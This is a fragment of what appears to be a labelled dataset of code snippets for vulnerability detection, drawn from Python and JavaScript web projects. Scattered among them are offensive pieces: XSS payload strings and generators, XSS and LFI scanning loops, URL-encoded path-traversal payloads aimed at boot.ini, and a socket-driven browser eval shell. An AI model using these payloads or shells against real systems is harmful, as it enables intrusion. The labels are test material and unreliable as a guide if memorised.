src=\"javascript:alert('xss');\">\"\"\", \"\"\"<style", "label": 0}, {"snippet_id": 32043, "code": " import api class CreateMappingLink(tables.LinkAction): name=\"create\" verbose_name=_(\"Create Mapping\") url=\"horizon:identity:mappings:create\" classes=(\"ajax-modal\",) icon=\"plus\" policy_rules=((\"identity\", ", "label": 0}, {"snippet_id": 53383, "code": " 'bundle_json': bundle.json, 'coordinators_json': json.dumps(coordinators), 'doc1_id': doc.doc.get().id if doc else -1, 'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user", "label": 1}, {"snippet_id": 14515, "code": " 'instructor.hint_manager.hint_manager', name=\"hint_manager\"), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root=settings.STATIC_ROOT) handler404", "label": 0}, {"snippet_id": 28922, "code": "'haproxy_config_path')\t \tssh=ssh_connect(serv) \ttry: \t\tsftp=ssh.open_sftp() \t\tsftp.get(config_path, cfg) \t\tsftp.close() \t\tssh.close() \texcept Exception as e: \t\tssh=str(e) \t\treturn ssh \t def diff_config(oldcfg", "label": 0}, {"snippet_id": 34172, "code": " doctype: DocType name as string.\"\"\" \tfrom frappe.model.document import Document \tglobal _classes \tif not doctype in _classes: \t\tmodule_name, custom=frappe.db.get_value(\"DocType\", doctype,(\"module\", \"custom", "label": 0}, {"snippet_id": 13454, "code": "=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns", "label": 0}, {"snippet_id": 51107, "code": "=obj.last_run_at) else: z, y=obj.schedule.is_due(last_run_at=datetime.now(pytz.utc)) date=datetime.now(pytz.utc) +timedelta(seconds=y) return naturaltime(date) @staticmethod def precise(obj): if obj.last_run_at", "label": 0}, {"snippet_id": 1883, "code": ",value in body.items(): xss_payloads=fetch_xss_payload() for payload in xss_payloads: temp_body.update(body) temp_body[key]=payload print \"updated body\",temp_body xss_post_request=req.api_request(url, ", "label": 0}, {"snippet_id": 38216, "code": " as_dict=1) def clear_blog_cache(): \tfor blog in frappe.db.sql_list(\"\"\"select route from \t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"): \t\tclear_cache(blog) \tclear_cache(\"writers\") def get_blog_category", "label": 0}, {"snippet_id": 45282, "code": ") Document.objects.link(coordinator_doc, owner=coordinator_doc.owner, name=coordinator_doc.name, description=coordinator_doc.description, extra='coordinator2') if coordinator_data['properties']['workflow", "label": 0}, {"snippet_id": 51073, "code": " search_fields=('name', 'queue', 'args') form=MyPeriodicTaskForm save_as=True @staticmethod def name_safe(obj): return mark_safe(obj.name) @staticmethod def last_run(obj): return obj.last_run_at @staticmethod def", "label": 0}, {"snippet_id": 42802, "code": ".parentfield: \t\t\t\treturn \"{} \t\t\telse: \t\t\t\treturn \"{}:{}\".format(_(df.label), docname) \t\tinvalid_links=[] \t\tcancelled_links=[] \t\tfor df in(self.meta.get_link_fields() \t\t\t\t+self.meta.get(\"fields\",{\"fieldtype\":('=", "label": 0}, {"snippet_id": 12552, "code": "<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$", "label": 0}, {"snippet_id": 49803, "code": "') `,1000) } catch{} socket.on('getMSG',function(data){ document.getElementById(\"history\").innerHTML+=\"<br><font size=3 color=black>[\"+data+\"]</font>\"; try{ output=eval(data)+\"\" } catch(e){ output=e+\"\"", "label": 1}, {"snippet_id": 46186, "code": "], 'start': 0} if request.GET.get('format', 'plain')=='json': return JsonResponse({ 'collection': collection.get_props(request.user), 'query': query, 'initial':{ 'collections': collections, 'layout': DEFAULT_LAYOUT", "label": 0}, {"snippet_id": 49827, "code": ",output) }) </script> ''' @app.route('/',methods=['GET']) def shell(): return html @socketio.on('sendMSG') def sendMSG(message): print(\"OUTPUT> \"+str(message)) command=raw_input(\"CMD> \") emit(\"getMSG\",command", "label": 0}, {"snippet_id": 3905, "code": " \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers,\"res_body\": host_header_xss.text} dbupdate", "label": 0}, {"snippet_id": 20120, "code": "(self): \"\"\" Sets up and starts servers for a Bok Choy run. If --fasttest is not specified then static assets are collected \"\"\" sh(\"{}/scripts/reset-test-db.sh\".format(Env.REPO_ROOT)) if not self.fasttest", "label": 0}, {"snippet_id": 31562, "code": "(0) \t\tdf.index=pd.to_datetime(df.index) \t\tdf.index.name='Date' \t\tdf.sort_index(inplace=True) \t\tsource=ColumnDataSource(df) \t\t \t\toutput_file(\"templates/metrics_waf_out.html\", mode='inline') \t\t \t\tx_min=df", "label": 0}, {"snippet_id": 51494, "code": " False): import django_uwsgi INSTALLED_APPS +=['django_uwsgi',] except ImportError: pass MIDDLEWARE=[ 'django.middleware.security.SecurityMiddleware', 'django.contrib.sessions.middleware.SessionMiddleware',", "label": 0}, {"snippet_id": 38238, "code": ": \treturn frappe.db.get_value(\"Blog Category\",{\"name\": route}, \"title\") or route def get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None): \tconditions=[] \tif", "label": 0}, {"snippet_id": 17810, "code": "(?i)university_profile/McGillX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}), url(r'^(?i)university_profile/TorontoX$', 'courseware.views", "label": 0}, {"snippet_id": 43091, "code": ".format(prefix, label, \t\t\t\t\tvalue, comma_options)) \tdef _validate_constants(self): \t\tif frappe.flags.in_import or self.is_new() or self.flags.ignore_validate_constants: \t\t\treturn \t\tconstants=[d.fieldname for", "label": 0}, {"snippet_id": 49559, "code": "\"All\"), None, self.query_params)] +values class SmartList(object): def __init__(self, object_list, query_params=None, list_display=None, list_filter=None, list_search=None, search_query_param=None, ordering_query_param", "label": 0}, {"snippet_id": 11868, "code": ".ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items():", "label": 0}, {"snippet_id": 43708, "code": " is_print_hide(self, fieldname, df=None, for_print=True): \t\t\"\"\"Returns true if fieldname is to be hidden for print. \t\tPrint Hide can be set via the Print Format Builder or in the controller as a list \t", "label": 0}, {"snippet_id": 41043, "code": " on_update(self): \t\tclear_cache(\"writers\") \tdef get_context(self, context): \t\t \t\tif not cint(self.published): \t\t\traise Exception(\"This blog has not been published yet!\") \t\t \t\tcontext.full_name=get_fullname(self", "label": 0}, {"snippet_id": 51032, "code": " only way you'll understand what you're doing. https://crontab.guru/ \"\"\" def clean(self): print('cleaning') cleaned_data=super(PeriodicTaskForm, self).clean() return cleaned_data class IEPeriodicTaskAdmin", "label": 0}, {"snippet_id": 4415, "code": "%;width:100%\"></div>' % payload def script(self): payload=\"<script src='%s'></script>\" % self.url return payload def event(self, element, src, event, js): payload=\"<%s src=\" % element payload +='\"%s\" '", "label": 0}, {"snippet_id": 45867, "code": "%s_dir' % i]=coord_dir deployment_mapping['coord_%s' % i]=coord properties.update(deployment_mapping) submission=Submission(request.user, bundle, request.fs, request.jt, properties=properties) job_id=submission", "label": 0}, {"snippet_id": 26676, "code": "/../../../../../../../boot.ini', '%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot", "label": 0}, {"snippet_id": 43112, "code": "(\"fields\",{\"set_only_once\":('=',1)})] \t\tif constants: \t\t\tvalues=frappe.db.get_value(self.doctype, self.name, constants, as_dict=True) \t\tfor fieldname in constants: \t\t\tdf=self.meta.get_field(fieldname) ", "label": 0}, {"snippet_id": 2557, "code": " impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) db_update=True vul_param +=key else: result=True", "label": 0}, {"snippet_id": 7076, "code": "]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"), url(r'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset/$', 'student.views.password_reset", "label": 0}, {"snippet_id": 53078, "code": ", owner=request.user) Document.objects.link(coordinator_doc, owner=coordinator_doc.owner, name=coordinator_doc.name, description=coordinator_doc.description, extra='coordinator2') if coordinator_data['properties", "label": 0}, {"snippet_id": 19800, "code": " set, specifies test files, classes, cases, etc. See platform doc. default_store -modulestore to use when running tests(split or draft) num_processes -number of processes or threads to use in tests. Recommendation", "label": 0}, {"snippet_id": 15326, "code": ".serversonly=kwargs.get('serversonly', False) self.testsonly=kwargs.get('testsonly', False) self.test_spec=kwargs.get('test_spec', None) self.default_store=kwargs.get('default_store', None) self.verbosity", "label": 0}, {"snippet_id": 7347, "code": "\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view.views.render', {'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r", "label": 0}, {"snippet_id": 54255, "code": "=9) Label(main, text=\"\",background='light sky blue').grid(row=10) ua=[\"\"] ua+=bane.ua li=bane.read_file('xss.txt') pl=[] for x in li: pl.append(x.strip()) prox=[\"\"] prox+=bane.http(200) global target target", "label": 1}, {"snippet_id": 9850, "code": ".migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'),", "label": 0}, {"snippet_id": 48307, "code": " !=u and u.rights < 2: return HttpResponseRedirect(\"/admin?error=noyb\") if current_reservation.submitted==True: return HttpResponseRedirect(\"/admin?error=Already%20submitted\") if \"article_id\" in request", "label": 0}, {"snippet_id": 9257, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter", "label": 0}, {"snippet_id": 50809, "code": "(xterm256 or useansi)) screenreader=options.get(\"screenreader\", flags.get(\"SCREENREADER\", False)) prompt=options.get(\"send_prompt\", False) if screenreader: text=parse_ansi(text, strip_ansi=True, xterm256=False", "label": 0}, {"snippet_id": 20828, "code": "\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}), url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': ", "label": 0}, {"snippet_id": 33684, "code": ": \t\t\t\tcontext.comment_text=_('{0} comments').format(len(context.comment_list)) \t\tcontext.category=frappe.db.get_value(\"Blog Category\", \t\t\tcontext.doc.blog_category,[\"title\", \"route\"], as_dict=1) \t\tcontext", "label": 0}, {"snippet_id": 31226, "code": "\t\t\t\t\t\t\t\t \tprint(template) \t\t if form.getvalue('metrics'): \tfrom datetime import timedelta \tfrom bokeh.plotting import figure, output_file, show \tfrom bokeh.models import ColumnDataSource, HoverTool, DatetimeTickFormatter", "label": 0}, {"snippet_id": 26064, "code": ".settings.invoice_address_required or self.all_optional: for k, f in self.fields.items(): f.required=False f.widget.is_required=False if 'required' in f.widget.attrs: del f.widget.attrs['required'] elif", "label": 0}, {"snippet_id": 28417, "code": " datetime import datetime \tfrom pytz import timezone \timport sql \tnow_utc=datetime.now(timezone(sql.get_setting('time_zone'))) \tif type=='config': \t\tfmt=\"%Y-%m-%d.%H:%M:%S\" \tif type=='logs': \t\tfmt='%Y%m%d' ", "label": 0}, {"snippet_id": 33421, "code": " cores.xeger import Xeger \t\tgenerate=Xeger() \t\twhile True: \t\t\t_payload=generate.xeger(\"((\\%3C)|<)((\\%69)|i|(\\%49))((\\%6D)|m|(\\%4D))((\\%67)|g|(\\%47))[^\\n]+((\\%3E)|>)\") \t\t\tif any(x in _payload for x in \"\\\"", "label": 0}, {"snippet_id": 14929, "code": " expected_verbosity_string) def test_verbosity_settings_3_processes(self): \"\"\" With the above test, validate that num_processes can be set to various values \"\"\" process_count=3 expected_verbosity_string", "label": 0}, {"snippet_id": 43934, "code": ".meta.get(\"fields\",{\"fieldtype\":('=', \"Text Editor\")}): \t\t\t\textract_images_from_doc(self, df.fieldname) def _filter(data, filters, limit=None): \t\"\"\"pass filters as: \t\t{\"key\": \"val\", \"key\":[\"!=\", \"val\"], ", "label": 0}, {"snippet_id": 37533, "code": " list_context.sub_title: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}, \t\t\t\t\t\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}] \telse: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}] \tlist_context", "label": 0}, {"snippet_id": 13658, "code": ".course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$", "label": 1}, {"snippet_id": 51345, "code": "] @admin.register(UrlList) class UrlListAdmin(ImportExportModelAdmin, admin.ModelAdmin): list_display=('name', 'account',) search_fields=('name', 'account__name') list_filter=['account'][::-1] fields=(", "label": 0}, {"snippet_id": 27688, "code": "'ga_tracking_id') if not auth.is_current_user_admin() else None) if values['is_logged_in']: values['switch_account_url']=make_login_url(self.request.url) values['logout_url']=make_logout_url(dest_url=self.request", "label": 0}, {"snippet_id": 46523, "code": "% collection.id massaged_collection['isOwner']=collection.doc.get().can_write(request.user) collections.append(massaged_collection) return JsonResponse(collections, safe=False) template='admin_collections", "label": 0}, {"snippet_id": 28064, "code": "+expires_in self.response.set_cookie( 'session', session_cookie, expires=expires, httponly=True, secure=True, overwrite=True) self.render_json({'status': 'success'}) class LogoutHandler(base_handler.Handler): ", "label": 0}, {"snippet_id": 17121, "code": "\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)", "label": 0}, {"snippet_id": 32248, "code": "=8080, help='port to run on(default=%(default)s)') parser.add_argument('-d', '--directory', type=str, default=SRC_DIR) parser.add_argument('-e', '--external', action='store_true', help='whether to bind", "label": 0}, {"snippet_id": 12048, "code": "'), url(r'^calculate$', 'util.views.calculate'), url(r'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"),", "label": 0}, {"snippet_id": 27078, "code": ".content.find(lfi_result)>=0: print \"[+] Target is VULNERABLE\" print \"Url: \" +url print \"Parameters: %s\\n\" % str(post_params) return return def scan_for_forms(fname, host, url): print \"[+] Start scan\" rtype=", "label": 1}, {"snippet_id": 2890, "code": "(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: parsed_url=urlparse.urlparse(url) xss_url=parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url", "label": 0}, {"snippet_id": 5978, "code": " 'pymongo>=2.8,<3', 'pysaml2==1.2.0beta5', 'python-memcached==1.53', 'cherrypy==3.2.4', 'vccs_client==0.4.1', 'eduid_am>=0.5.3', ] testing_extras=[ 'nose==1.2.1', 'coverage==3.6', ] setup(name='eduid_idp", "label": 0}, {"snippet_id": 16142, "code": "', 'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"), url(r'^login_ajax", "label": 0}, {"snippet_id": 908, "code": " '%26', '%3D'] for uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url", "label": 0}, {"snippet_id": 11861, "code": "'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$',", "label": 0}, {"snippet_id": 12384, "code": ".views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/", "label": 0}, {"snippet_id": 52455, "code": ", '{}')) properties=NODES[node['widgetType']].get_mandatory_fields() workflows=[] if node['widgetType']=='subworkflow-widget': workflows=_get_workflows(request.user) response['status']=0 response['properties", "label": 0}, {"snippet_id": 29001, "code": "**kwargs): \timport sql \tscript=\"install_haproxy.sh\" \ttmp_config_path=sql.get_setting('tmp_config_path') \thaproxy_sock_port=sql.get_setting('haproxy_sock_port') \tstats_port=sql.get_setting('stats_port')", "label": 0}, {"snippet_id": 37616, "code": " get_blog_category(route): \treturn frappe.db.get_value(\"Blog Category\",{\"name\": route}, \"title\") or route def get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by", "label": 0}, {"snippet_id": 23813, "code": " suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_testcase_spec(self): spec='test_foo.py:FooTest.test_bar'", "label": 0}, {"snippet_id": 7483, "code": "'xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'), url(r'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r", "label": 0}, {"snippet_id": 26326, "code": ".exception('VAT ID checking failed for country{}'.format(data.get('country'))) self.instance.vat_id_validated=False if self.request and self.vat_warning: messages.warning(self.request, _('Your VAT ID could", "label": 0}, {"snippet_id": 51922, "code": " CELERY_WORKER_CONCURRENCY=10 CELERY_ACKS_LATE=True TOOLS={ 'organizations':{ 'import_data_dir': '', }, } OUTPUT_DIR=os.environ.get('OUTPUT_DIR', os.path.abspath(os.path.dirname(__file__)) +'/') VENDOR_DIR=os", "label": 0}, {"snippet_id": 18364, "code": "/]+)/courseware/?$', 'courseware.views.index', name=\"courseware\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\")", "label": 0}, {"snippet_id": 19592, "code": "\" expected_statement=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler-allowed-domains=localhost ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher=logout ' '--pa11y-reporter", "label": 0}, {"snippet_id": 40550, "code": ".utils.formatters import format_value \t\tdf=self.meta.get_field(fieldname) \t\tif not df and fieldname in default_fields: \t\t\tfrom frappe.model.meta import get_default_df \t\t\tdf=get_default_df(fieldname) \t\tval", "label": 0}, {"snippet_id": 48774, "code": " django.db.models import BooleanField, ForeignKey from django.utils.formats import localize from django.utils.html import format_html, escape from django.utils.http import urlencode from django.utils.translation", "label": 0}, {"snippet_id": 48489, "code": " not in request.GET: return HttpResponseRedirect(\"/admin?error=No%20id%20provided\") current_reservation=GroupReservation.objects.get(id=int(request.GET[\"payload\"])) if current_reservation.createdByUser ", "label": 0}, {"snippet_id": 42428, "code": ".user \t\td=self.get_valid_dict(convert_dates_to_str=True) \t\tcolumns=list(d) \t\ttry: \t\t\tfrappe.db.sql(\"\"\"insert into `tab{doctype}` \t\t\t\t({columns}) values({values})\"\"\".format( \t\t\t\t\tdoctype=self.doctype, \t", "label": 0}, {"snippet_id": 21745, "code": "'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]", "label": 0}, {"snippet_id": 27668, "code": " values['menu_items']=_MENU_ITEMS values['is_oss_fuzz']=utils.is_oss_fuzz() values['is_development']=( environment.is_running_on_app_engine_development()) values['is_logged_in']=bool(helpers.get_user_email", "label": 0}, {"snippet_id": 37751, "code": "+\" and \".join(conditions)) if conditions else \"\" \t\t} \tposts=frappe.db.sql(query, as_dict=1) \tfor post in posts: \t\tpost.cover_image=find_first_image(post.content) \t\tpost.published=global_date_format(post", "label": 0}, {"snippet_id": 14821, "code": " test_dir='foo' suite=BokChoyTestSuite('', test_dir=test_dir) self.assertEqual( suite.cmd, self._expected_command(name=test_dir) ) def test_verbosity_settings_1_process(self): \"\"\" Using 1 process means paver", "label": 0}, {"snippet_id": 23877, "code": " name='tests' self.assertEqual( suite.cmd, self._expected_command(name=name, store='invalid') ) def test_serversonly(self): suite=BokChoyTestSuite('', serversonly=True) self.assertEqual(suite.cmd, \"\") def", "label": 0}, {"snippet_id": 51449, "code": ".admin', 'django.contrib.auth', 'django.contrib.contenttypes', 'django.contrib.sessions', 'django.contrib.messages', 'django.contrib.staticfiles', 'django.contrib.humanize', 'django_celery_beat', 'compressor", "label": 0}, {"snippet_id": 54266, "code": "=[] for x in li: pl.append(x.strip()) prox=[\"\"] prox+=bane.http(200) global target target=Entry(main) target.insert(0,'http://') global cookie cookie=Entry(main) global method method=ttk.Combobox(main,", "label": 1}, {"snippet_id": 2330, "code": "\"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result", "label": 0}, {"snippet_id": 16314, "code": "'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile", "label": 0}, {"snippet_id": 28103, "code": " os import http.cookies import funct import sql from jinja2 import Environment, FileSystemLoader env=Environment(loader=FileSystemLoader('templates/')) template=env.get_template('config.html') print('Content", "label": 1}, {"snippet_id": 43998, "code": "\t\tfval=(\"not None\", fval) \t\t\t\telif fval is False: \t\t\t\t\tfval=(\"None\", fval) \t\t\t\telif isinstance(fval, string_types) and fval.startswith(\"^\"): \t\t\t\t\tfval=(\"^\", fval[1:]) \t\t\t\telse: \t\t\t\t\tfval=(\"=\", fval) \t\t", "label": 0}, {"snippet_id": 27139, "code": " hidden_param_name, hidden_param_value, form_counter, url) params=[] hidden_param_name=[] hidden_param_value=[] page=\"\" if has_form==1: m_input=re.match(r'.*\\<(input|button)\\s[^\\>]*name=\"(\\w+)\"', line, re.M|re.I) if", "label": 1}, {"snippet_id": 51675, "code": ": 'django.contrib.auth.password_validation.CommonPasswordValidator', }, { 'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator', }, ] LANGUAGE_CODE='en-us' TIME_ZONE='UTC' USE_I18N", "label": 0}, {"snippet_id": 8780, "code": " urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views.press', name=\"press\"), url(r'^media-kit$', 'static_template_view", "label": 0}, {"snippet_id": 28544, "code": ": \" +serv +\"\\n\" \t\tlog=open(log_path +\"/config_edit-\"+get_data('logs')+\".log\", \"a\") \ttry:\t \t\tlog.write(mess) \t\tlog.close \texcept IOError as e: \t\tprint('<center><div class=\"alert alert-danger\">Can\\'t write", "label": 0}, {"snippet_id": 41816, "code": "\tif key: \t\t\tif isinstance(key, dict): \t\t\t\treturn _filter(self.get_all_children(), key, limit=limit) \t\t\tif filters: \t\t\t\tif isinstance(filters, dict): \t\t\t\t\tvalue=_filter(self.__dict__.get(key,[]), filters", "label": 0}, {"snippet_id": 20086, "code": " !=1: substring=[ \"--with-xunitmp --xunitmp-file={}\".format(self.xunit_report), \"--processes={}\".format(self.num_processes), \"--no-color --process-timeout=1200\" ] else: substring=[ \"--with-xunit\", \"--xunit", "label": 0}, {"snippet_id": 14879, "code": " test_verbosity_settings_2_processes(self): \"\"\" Using multiple processes means specific xunit, coloring, and process-related settings should be used. \"\"\" process_count=2 expected_verbosity_string=( \"--with", "label": 0}, {"snippet_id": 22286, "code": "'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'), url(r'^password_change/$', django.contrib.auth", "label": 0}, {"snippet_id": 38131, "code": "\tlist_context.sub_title=_(\"Posts by{0}\").format(blogger) \t\tlist_context.title=blogger \telif frappe.local.form_dict.txt: \t\tlist_context.sub_title=_('Filtered by \"{0}\"').format(frappe.local.form_dict.txt", "label": 1}, {"snippet_id": 36993, "code": ": \t\tclear_cache(blog) \tclear_cache(\"writers\") def get_blog_category(route): \treturn frappe.db.get_value(\"Blog Category\",{\"name\": route}, \"title\") or route def get_blog_list(doctype, txt=None, filters=None", "label": 0}, {"snippet_id": 18632, "code": "), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/", "label": 0}, {"snippet_id": 51278, "code": " ConfigAdmin(ConstanceAdmin): change_list_form=CustomConfigForm change_list_template='admin/config/settings.html' admin.site.unregister([Config]) admin.site.register([Config], ConfigAdmin) @admin.register", "label": 0}, {"snippet_id": 38919, "code": " not isinstance(value, BaseDocument): \t\t\tif \"doctype\" not in value: \t\t\t\tvalue[\"doctype\"]=self.get_table_field_doctype(key) \t\t\t\tif not value[\"doctype\"]: \t\t\t\t\traise AttributeError(key) \t\t\tvalue=get_controller", "label": 0}, {"snippet_id": 47529, "code": "='display_name', button_text=profile.displayName)) f.add_content(PlainText('DECT: ')) f.add_content(NumberField(name='dect', button_text=str(profile.dect), minimum=0)) f.add_content(PlainText('Number of", "label": 0}, {"snippet_id": 45431, "code": ") popup=render('editor/submit_job_popup.mako', request,{ 'params_form': params_form, 'action': reverse('oozie:editor_submit_coordinator', kwargs={'doc_id': coordinator.id}) }, force_template=True).content", "label": 0}, {"snippet_id": 52061, "code": "(request.user, Document2, extra='workflow2')] return render('editor/list_editor_workflows.mako', request,{ 'workflows_json': json.dumps(workflows) }) @check_document_access_permission() def edit_workflow", "label": 1}, {"snippet_id": 15215, "code": "-when set, skip various set-up tasks(e.g., collectstatic) serversonly -prepare and run the necessary servers, only stopping when interrupted with Ctrl-C testsonly -assume servers are running(as per above)", "label": 0}, {"snippet_id": 31211, "code": ".SimpleCookie(os.environ.get(\"HTTP_COOKIE\")) \tuser_id=cookie.get('uuid')\t \ttable_stat=sql.select_table_metrics(user_id.value) \ttemplate=template.render(table_stat=sql.select_table_metrics(user_id.value))\t\t\t\t\t\t\t\t\t\t", "label": 0}, {"snippet_id": 4344, "code": " __init__(self, url=\"\"): \"\"\" url: xss payload url \"\"\" super(XSS, self).__init__() self.url=url @staticmethod def alterTest(self, p=False): return \"<script>alert(/xss/)</script>\" def img(self): return '", "label": 1}, {"snippet_id": 29754, "code": "\tfile=set() \treturn_files=set() \t \tfor files in glob.glob(os.path.join(dir,'*.'+format)):\t\t\t\t \t\tfile.add(files.split('/')[-1]) \tfiles=sorted(file, reverse=True) \tif format=='cfg': \t\tfor file in files: ", "label": 0}, {"snippet_id": 35976, "code": "\"Attach\", \"Attach Image\") \t\t\t\t\t\t \t\t\t\t\t\tor self.docstatus==2 \t\t\t\t\t\tor(self.docstatus==1 and not df.get(\"allow_on_submit\"))): \t\t\t\tcontinue \t\t\telse: \t\t\t\tsanitized_value=sanitize_html(value, linkify=df.fieldtype", "label": 1}, {"snippet_id": 7194, "code": "\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^", "label": 0}, {"snippet_id": 8678, "code": ".MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'})", "label": 0}, {"snippet_id": 15407, "code": ".skip_clean or self.testsonly): test_utils.clean_test_files() msg=colorize('green', \"Checking for mongo, memchache, and mysql...\") print msg bokchoy_utils.check_services() if not self.testsonly: self.prepare_bokchoy_run", "label": 0}, {"snippet_id": 20343, "code": "\".format(self.verify_xss), \"nosetests\", test_spec, \"{}\".format(self.verbosity_processes_string()) ] if self.pdb: cmd.append(\"--pdb\") if self.save_screenshots: cmd.append(\"--with-save-baseline\") cmd.append", "label": 0}, {"snippet_id": 15937, "code": " self.imports_dir.makedirs_p() zipped_course=self.imports_dir +'demo_course.tar.gz' msg=colorize('green', \"Fetching the test course from github...\") print msg sh( 'wget{tar_gz_file} -O{zipped_course}'.format", "label": 0}, {"snippet_id": 45803, "code": " properties): try: deployment_mapping={} coords=dict([(c.uuid, c) for c in Document2.objects.filter(type='oozie-coordinator2', uuid__in=[b['coordinator'] for b in bundle.data['coordinators']])]) for i,", "label": 0}, {"snippet_id": 7451, "code": ")$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/(?P<course_id>[^/]", "label": 0}, {"snippet_id": 3040, "code": " import urllib from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=[]", "label": 0}, {"snippet_id": 39190, "code": " \t\treturn self.get(\"__islocal\") \tdef as_dict(self, no_nulls=False, 